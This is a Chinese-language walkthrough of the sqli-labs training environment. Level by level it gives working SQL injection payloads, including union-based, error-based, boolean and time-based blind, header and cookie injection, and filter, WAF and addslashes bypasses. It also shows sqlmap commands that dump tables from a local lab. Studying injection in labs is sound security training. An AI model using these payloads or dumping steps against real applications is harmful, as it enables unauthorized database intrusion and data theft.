# Sqli_Lab

## 0x00 安装及部署

[Sqli-Lab](!https://github.com/Audi-1/sqli-labs)是印度一个小哥弄出来练习SQL注入教程，但是因为项目是几年前的，在目前的PHP7环境下已经无法运行,后来我找了另外一个修改后可以使用的版本,[Sqli_Edited_Version](!https://github.com/Rinkish/Sqli_Edited_Version).
部署也相对简单，我是放在我kali的虚拟机里面，从github上面下载好以后，首先是到刚下载好的项目中寻找文件夹sql-connections。从里面找db-creds.inc文件

```php
<?php
//give your mysql connection username n password
$dbuser ='root';
$dbpass ='root';
$dbname ="security";
$host = 'localhost';
$dbname1 = "challenges";
?>
```

把$dbuser,$dbpass两个参数修改为本地MySQL的账户密码。

然后在终端输入一下命令:

- service apache2 start
- service mysql stop
- mysqld_safe - -skip-grant-tables
就可以开始使用了。(有时候执行这个命令也不行就换成-service mysql start)

又用了一段时间，这个版本的sqli-lab好像也不太对。于是学习了docker，按照教程安装了docker版的sqli-lab。(docker真的方便).

要使用时首先在服务中启用`service docker start`,随后`docker run -dt --name sqli-lab -p 8888:80 --rm acgpiano/sqli-labs`，其中`-dt`是让其在后台运行，`--name`将其命名为`sqli-lab`,`-p`是映射端口号，前面的端口号是本地端口号，后面的端口号是docker中的端口号,`--rm`是完成后删除开启的资源。

完成以上步骤后就可以在浏览器打开使用了。

## 0x01 Basic Challenges

1. GET - Error based - Single quotes - String

    提示`Please input the ID as parameter with numeric value`，在页面URL末尾添加参数?id=1,更换id值的时候页面内容随着变化，加入%27后出现报错内容:

    ```sql
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line
    ```

    需要注意的是`''1'' LIMIT 0,1'`这一句，去掉开头与结尾用来引用的单引号后是`'1'' LIMIT 0,1`。我们可以看到服务器期望得到的是`id='1'`，但因为我们加入了%27，所以1后面多了一个单引号。

    为了让语句正确执行,能够继续进行注入，所以我们在`?id=1%27`末尾加上`#`号，变为`?id=1%27%23`，于是之前报错的Sql语句由`'1'' LIMIT 0,1`变为了`'1'#' LIMIT 0,1`,加入一个`#`号，后面的语句被注释，就不会报错。

    继续按照正常步骤依次构造`id=1%27%20order%20by%203%23`猜测出页面参数个数为3

    随后寻找显示位，构造`id=-1%27%20union%20select%201,2,3%23`,这一句的难点在于`id=-1`这部分。正常的逻辑是`id=1`，那么页面显示出`id=1`的对应数据库中的字段内容。但此刻我们想让构造的`union select`后面的内容显示出来，就要让id的值是一个不存在的数，例如-1或者其他字符串才行。

    接着往下走就是常规操作，记住`information_schema`、`table_schema`、`table_name`、`column_name`等关键的表、列等名称就行。

2. GET-Error bases- intiger based

    题目提示是数字型注入，构造`id=1%27`，看到报错信息`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 0,1' at line 1`

    需要注意的是这个题目的报错内容和上个题目的报错内容不一致。字符型注入报错时带有ID内容，比如id=2%27时，报错有`2'' LIMIT 0,1`；而数字型注入报错时id值就没有显示:`' LIMIT 0,1'`。这是因为网页后台对于字符串的处理是获取到ID内容后在内容的两边添加单引号，对于数字的处理不需要添加单引号。

    根据以上判断，首先构造`id=1%20order%20by%203` 判断页面变量数目(注意这个地方和字符型注入的异同，正常构造就行了，不需要加入注释符)。然后继续往下走就是常规操作了。

3. Less-3 Error Based- String (with Twist)

    常规操作，构造`id=1\`看反应，反馈报错`'1\') LIMIT 0,1`，可以看出是个字符型注入并且外面多一个括号`)`。因此构造`id=1')%23`闭合。剩余就是常规操作。

4. Less-4 Error Based- DoubleQuotes String

   构造`id=1\`，反馈报错`"1\") LIMIT 0,1`，可以看出是个双引号包裹的字符型注入,外面有一个括号`)`。因此构造`id=1")%23`闭合。剩余就是常规操作。

5. Less-5 Double Query- Single Quotes- String

    构造`id=1\`,页面反馈`'1\' LIMIT 0,1`用单引号包裹,构造`id=1%27%23`闭合。在剩下的常规操作`union%20select%201,2,3`时，发现页面没有显示我们的测试内容，只显示了`You are in...........`。再构造`id=1' and  1=1#`时页面显示正常，而构造`id=1' and  1=2#`页面显示错误。那么我们就可以填入我们想要判断的内容，根据页面反馈来看是否判断正确。

    盲注的方式可以有三种：一种是用Python脚本，二种是用SQLmap工具，三种是用burpsuite。
    我们用sqlmap工具直接跑。参数中-v 3是为了显示payload，--technique=B是明确我们使用Boolean型注入方式

    1. `sqlmap -u 'http://127.0.0.1/Sqli_Edited_Version/sqlilabs/Less-5/?id=1' -v 3 --technique=B --current-db` 得到库名称security
    2. `sqlmap -u 'http://127.0.0.1/Sqli_Edited_Version/sqlilabs/Less-5/?id=1' -v 3 --technique=B -D security --tables`得到表名称
    3. `sqlmap -u 'http://127.0.0.1/Sqli_Edited_Version/sqlilabs/Less-5/?id=1' -v 3 --technique=B -D security -T email --columns`得到字段名称
    4. `sqlmap -u 'http://127.0.0.1/Sqli_Edited_Version/sqlilabs/Less-5/?id=1' -v 3 --technique=B -D security -T email -C email_id --dump`得到字段内容

    以上就是大概的过程，不过我常常因为无法区分单减号和双减号的区别而要现查SqlMap的用法。

6. Less-6 Double Query- Double Quotes- String

    构造`id=1\`,页面反馈`"1\" LIMIT 0,1`,双引号包裹，后来测试下来是一个布尔型盲注，和第5题差不多，不多说。

7. Less-7 Dump into Outfile

    构造`id=1\`,页面反馈`You have an error in your SQL syntax`,并没有提示出具体的出错语句。先测试如何闭合原语句。

    1. 首先判断数据类型，首先`id=1`，页面提示正常。然后尝试`id=54321`，页面提示出错。最后尝试`id=54321-54320`，页面提示出错，因此是字符类型。

    2. 判断如何闭合,首先单引号`id=1'#`以及`id=1'--+`，页面提示出错，因此可能不是这么闭合的。再尝试`id=1' and '1'='1`以及`id=1' and '1'='2`页面出现不同反应，因此可以进行盲注。盲注的地方是以上两个判断的中间，`id=1 and (判断位置) and '1'='1`

    3. 剩下的都是盲注的常规操作，略过了.但是要注意的是这个题目的两个陷阱
        1. 第一个进行布尔盲注时报错的页面和正常的页面字符数是一致的。因此报错注入时候要考虑内容的不同而不仅仅是字符数多少。
        2. 第二个是进行睡觉注入时，如果规定sleep(1)，那么页面会延迟14秒左右，如果规定sleep(2)，那么页面会延迟28秒左右。不知道后台页面是什么骚操作。

    其实虽然用以上的方法可以得到我们想要的结果。但是有点奇怪的是我用sqlmap工具完成这个题目时，给出的payload却是不一样的闭合方式`id=1') AND 4645=4645 AND ('bpBu'='bpBu`。和我们不同的地方在于sqlmap里面闭合是有括号的。

    我们查看源文件，给出的查询语句是`SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1`。我们再把查询语句和两种payload结合起来看异同:

    ```SQL
    SELECT * FROM users WHERE id=(('1' and 1=1 and '1'='1')) LIMIT 0,1 #我们的payload
    SELECT * FROM users WHERE id=(('1') AND 4645=4645 AND ('bpBu'='bpBu')) LIMIT 0,1 #SQLMap的payload
    ```

    从上面可以看出其实两个判断都是差不多的，最后id得到的都是布尔值0或者1.因此构造`1')) and 1=1#`也是同样可以完成注入。

8. Less-8 Blind- Boolian- Single Quotes- String

    尝试`id=1' and 1=1#`，可以进行盲注。常规操作不细说了。

9. Less-9 Blind- Time based- Single Quotes- String

    无论输入的是单引号、双引号、加括号，结果都是不变。因此考虑是时间盲注，尝试`id=1' and (select sleep(5)) and '1'='1`，页面果然睡觉5秒。剩下过程不赘述。

10. Less-10 Blind- Time based- Double Quotes- String

    尝试`id=1” and (select sleep(5)) and “1”=“1`，可以进行盲注。

11. Less-11- Error Based- String

    页面出现了登录框。尝试弱口令admin/admin可以成功登录。但是我们是要进行注入，万能账号密码:admin' or 1=1 #/密码随便填完成登录。
    但是其实这个题目还可以通过报错注入得到结果，以下是过程：

    首先我们知道，报错注入常用的有三个方法。

    第一个是使用`count(),floor(),group by`三个函数

    ```SQL
    id=1%27 and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))a from information_schema.tables group by a)x)
    ```

    第二个是使用`updatexml()`

    ```SQL
    id=1%27 and (updatexml(1,concat(0x7e,(payload),0x7e),1))
    ```

    第三个是使用`extractvalue()`

    ```SQL
    id=1%27 and (extractvalue(1,concat(0x7e,(payload),0x7e)))
     ```

    第一个方法可以输出64个字符，第二第三个字符输出32个字符。

12. Less-12- Error Based- Double quotes- String

    登录框账号处输入`admin\`，页面提示错误`"admin\") and password=("") LIMIT 0,1`,看出来是一个双引号加括号的闭合。构造账号为`admin") or 1=1#`成功登录。报错注入也可以完成。

13. Less-13- Double Injection- String- with twist

    构造`admin\`作为用户名登录，页面提示`'admin\') and password=('') LIMIT 0,1`，是一个单引号加上括号的闭合，构造`admin') or 1=1#`登录。也可以进行报错注入。

14. Less-14- Double Injection- Double quotes- String

    是双引号闭合，不赘述。

15. Less-15- Blind- Boolian Based- String

    ```SQL
    1' or '1'='1'#
    1" or "1"="1"#
    1') or ('1'='1')#
    1") or ("1"="1")#
    ```

    用以上payload跑了用户名框，根据反馈而页面大小内容确定payload是`1' or '1'='1'#`.因为页面没有反馈具体内容，所以必须要根据盲注要注入。布尔型盲注`1' or payload#`,时间型盲注`admin' and (payload)#`。时间型盲注中因为用了and,所以用户名要和数据库中的数据一致。其他不赘述。

16. Less-16- Blind- Time Based- Double quotes- String

    与上个题目类似，只是这个题目的闭合方式是双引号加括号`")`

17. Less-17 Update Query- Error based - String

    这次的题目不再是对数据进行查询，而是更新update。经过对表单的两个输入框分析，应该是通过填入用户名以及密码然后更新。基本语句是`update table_name set passwd=$_POST['passwd'] where username=$_POST['uname'];`

    那么可以尝试注入的地方就有uname和passwd了。

    1. 首先尝试对uname进行注入。第一个想法是考虑到uname的位置是处于语句的末尾，那么可以尝试堆叠注入，不过失败了。第二个想法是构造`username='admin' and (select sleep(5))`。但是执行时失败了，有提示不要注入的语句，可能是被过滤。

    2. 尝试对passwd进行注入。构造`1' and (select sleep(1))#`可以进行睡眠。适合进行盲注。但是奇怪的是如果构造的第一个字符不是数字而是其他字符就不能成功，并且睡眠时间要大于我们设置的时间。

    3. 使用报错注入也可以完成。`1' and (select 1 from (select count(*),concat((payload)),floor(rand(0)*2))a from information_schema.tables group by a)x )`

18. Less-18 Header Injection- Error Based- string

    这个题目还挺奇葩的，登录成功后才会出现关键点，会出现你的User-Agent内容，所以注入点就是在user-agent里面。

    1. 首先用`1' #`,但是没有闭合成功，报错。所以换一种方式`1' and '1'='1`以及`1' and '1'='2`都没有任何反应。再尝试`1' and (select sleep(5)) and '1'='1`成功。

    2. 也可以用报错注入`1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))a from information_schema.tables group by a)x) and '1'='1`

19. Less-19 Header Injection- Referer- Error Based- string

    这个题目和上一个题目类似，直接使用报错注入或者时间注入

    报错注入：`1' and (extractvalue(1,concat(0x7e,(payload),0x7e))) and '1'=1`
    时间盲注：`1' and (select sleep(5)) and '1'='1`

20. Less-20 Cookie Injection- Error Based- string

    这个题目有两个部分，第一部分是登录；第二部分是登录成功后Cookie会变成`uname=admin`，这时候页面会把UA、Cookie这些内容显示出来。

    我按照以前的思路，一开始就在登录时候尝试对Cookie内容进行注入，没有反应。后来看了其他人的WriteUp才发现是在第二部分在Cookie中注入内容，并且前面要完全符合uname=admin的格式才能注入。剩下的就是常规操作`uname=admin' order by ...`

21. Less-21 Cookie Injection- Error Based- complex - string

    和20题一样的套路，只是用Base64进行了编码，但是这样下去手动的注入可不行啊。用用工具吧，tamper里面有现成的base64encode。通过这个语句直接完成`sqlmap -r Desktop/temp.txt --tamper=base64encode -v 3`

22. Less-22 Cookie Injection- Error Based- Double Quotes - string

    和前两个一样的题目，直接用sqlmap跑的。有个地方记录一下，我的操作是先在burp里面把访问记录抓包，然后用leafpad保存，最后用sqlmap的-r参数执行。但是我发现保存时候leafpad有个换行符部分要注意。

    > Dos和windows采用回车+换行CR/LF表示下一行,而UNIX/Linux采用换行符LF表示下一行，苹果机(MAC OS系统)则采用回车符CR表示下一行.

    在kali里面使用leafpad保存的时候不能使用CR方式保存。否则sqlmap会报错。

## 0x02 Advanced Injections

1. Less-23 Error Based- no comments

    看起来是一个常规题目，在url中构造`?id=1'`后题目报错`'1'' LIMIT 0,1`，从报错内容看出来是个单引号闭合。于是尝试了`id=1'#`以及`id=1'--+`都没法闭合成功，猜测是过滤了一些符号。于是转换成`id=1' and '1'='1`，成功。

2. Less-24 - Second Degree Injections

    看标题是提示两级注入。首先分析一下一共有5个页面:有登录框的页面index.php(似乎不会把提交的用户名和密码和数据库内容做比对)、登录后的页面login.php(用户名密码正确与否都是一个页面)、用户注册页面new_user.php(如果用户已经存在会有弹窗)、成功注册后的页面login_create.php、忘记密码页面forgot_password.php。自己研究了一下，发现我这个版本页面有问题。算了。

3. Less-25 Trick with OR & AND

    页面提示对`and`、`or`这两个关键词进行了过滤。但是经过测试可以用double形状通过。其实我们在注入的时候也不怎么用到这两个关键词，只是在对`information_schema`查询的时候注意information中间有一个or，需要修改为oOrr.

4. Less-25a Trick with OR & AND Blind

    题目中过滤了`and`、`or`，使用double形式绕过。可以使用`id=1%20anandd%20(length(database())=9)`的形式注入，另外还可以通过时间盲注和union注入。

5. Less-26 Trick with comments

    首先说明一下一个小陷阱，首先页面中是提示`Please input the ID as parameter with numeric value`，ID的值应该为数值类型，但实际上如果我们传递的不是数值类型而是字符串类型，到最后数据库也会根据其需要的相应类型做转换。所以这个题目中`id=1`与`id='1'`是一样的效果，这样就方便我们构造闭合。

    然后我们看到页面中提示我们空格以及注释都被规避掉了，我尝试使用换行符、制表符等都不行，并且`and`、`or`这两个关键字也被屏蔽，所以应该考虑使用select(column_name)from(table_name)语句来绕过空格过滤。此外针对注释被过滤的情况，无法使用`#`、`--`来闭合，但可以使用`and '1'='1`这类的方式来接结尾。

    最后的构造语句是`1'anandd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoORrmation_schema.tables)where(table_schema=database())),0x7e),1))anandd'1'='1`,使用报错注入就行了。另外，如果anandd这类的还是被过滤，可以试试&& ||方式

6. Less-26a Trick with comments

    `and`、`or`、注释、空格都被过滤，因此使用`id=1'anandd(1=2)anandd'1'='1`绕过。

7. Less-27 Trick with SELECT & UNION

    `1'and(length(database())=9)and'1'='1` 可过。

8. Less-27a Trick with SELECT & UNION

    测试了`?id=1+1`,页面返回了`?id=11`的结果。测试了`?id=1+and1`，页面返回了`?id=1`的结果，但是`and`并没有被过滤。因此一开始猜测后台页面进行了两种操作，第一种操作是将敏感内容使用空格替换，例如`+`、`-`、`#`等。第二种操作是id的取值是一个个判断是否是数字型，如果不是数字型则停止取值。

    后来发现猜测是错误的，从后台页面第32行`$id = '"' .$id. '"';`看到，实际上id的取值是使用双引号进行包裹。

    所以构造`1"and(length(database())=9)and"1"="1`可以绕过。网上有writeup提示通过构造%a0是可以解析成空格，但是我一直无法实现，可能是因为php版本的问题吗？

9. Less-28 Trick with SELECT & UNION

    同样是单引号闭合，构造`id=1'and(1=1)and'1'='1`过关。

10. Less-28a Trick with SELECT & UNION

    老payload`id=1'and(1=2)and'1'='1`可以过关。

    另外需要特别注意的是，因为减号`-`也没有被过滤，可以使用`-- asdf`来注释掉后面的语句，经过`id=1'--+`、`id=1"--+`、`id=1')--+`的测试，得知闭合方式是`id=('1')`。此外被过滤的只是`union select`.所以可以使用`union all select`替代完成注入。payload可以是`id=-1') union all select 1,2,database()-- dsfd`

11. Less-29 Protection with WAF

    waf好像只过滤了`#`，所以使用`--+`作为注释。然后使用常规的UNION注入就能完成。

12. Less-30

    `#`还是被过滤的，首先使用`id=1'`页面没有反应，后来使用`id=1"`页面没有返回内容了，再使用`id=1"--+`测试，页面返回正常。后来构造了`id=-1" union select 1,2,3 -- sdsf`实现注入。

13. Less-31 FUN with WAF

    测试`id=1'`、`id=1"`等，发现是使用`id=1")`闭合。然后就是常规的UNION注入。

14. Less-32 Bypass addslashes()

    题目提示了有`addslashes()`函数，也就是说在进行一些特殊符号输入的时候会被加上转义符。例如我们输入`?id=1'`就会被转义成`?id=1\'`。对于这种过滤方式一般可以采取两种对策，一种是在payload中加入单数量的反斜杠`\`，但是这一关我试过没作用。第二种方法是尝试进行宽字符注入。构造`?id=1%df%27 --+`进行闭合。

15. Less-33 Bypass addslashes()

    这个题目和上个题目差不多，使用`?id=-1%df%27%20union%20select%201,2,3%23`可以进行注入，但是要注意的是当查询列名称的时候由于`addslashes()`函数过滤了单引号，所以`select column_name from information_schema.columns where table_name='users'`这一句最后指明表名称的时候需要替换为16进制。
